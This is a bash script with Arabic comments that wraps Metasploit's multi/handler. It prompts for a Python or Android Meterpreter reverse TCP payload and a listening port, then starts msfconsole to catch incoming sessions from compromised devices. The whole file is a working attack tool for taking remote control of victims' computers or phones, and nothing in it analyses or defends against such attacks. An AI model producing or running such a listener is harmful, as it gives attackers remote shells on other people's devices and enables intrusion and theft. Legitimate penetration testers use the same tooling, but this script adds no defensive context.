#!/bin/bash

# إعداد الألوان
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'

# بنر البداية
echo -e "${BLUE}==========================="
echo -e "${YELLOW}   MSFHandler - Reverse TCP"
echo -e "${BLUE}==========================="
echo ""

# خيار الاختيار بين Python و Android
echo -e "${GREEN}Please select the session type:"
echo -e "1) Python Meterpreter"
echo -e "2) Android Meterpreter"
echo -e "${RESET}"
read -p "Enter the number (1 or 2): " session_type
echo ""

# طلب البورت من المستخدم
read -p "Enter the desired listening port (lport): " lport
echo ""

# تحديد نوع الحمولة بناءً على الاختيار
if [ "$session_type" -eq 1 ]; then
    payload="python/meterpreter/reverse_tcp"
    echo -e "${YELLOW}You have selected Python Meterpreter.${RESET}"
elif [ "$session_type" -eq 2 ]; then
    payload="android/meterpreter/reverse_tcp"
    echo -e "${YELLOW}You have selected Android Meterpreter.${RESET}"
else
    echo -e "${RED}Invalid selection. Exiting...${RESET}"
    exit 1
fi

# عرض إعدادات الاستماع
echo -e "${GREEN}Starting MSFconsole with the selected options...${RESET}"

# بدء ميتاسبلويت مع الخيارات المناسبة
msfconsole -q -x "
use multi/handler;
set payload $payload;
set lhost 0.0.0.0;
set lport $lport;
exploit;
exit
"

echo -e "${BLUE}Session started successfully.${RESET}"
